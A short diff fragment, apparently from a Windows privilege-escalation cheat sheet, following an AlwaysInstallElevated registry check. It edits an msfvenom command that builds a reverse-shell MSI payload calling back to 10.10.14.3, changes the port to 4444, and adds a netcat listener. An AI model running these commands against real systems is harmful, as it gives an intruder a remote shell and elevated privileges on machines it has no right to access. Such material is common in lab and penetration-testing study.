@@ -354,7 +354,11 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=4444 -f msi > aie.msi
+```
+
+```bash
+nc -lvnp 4444
 ```
 
 ```cmd
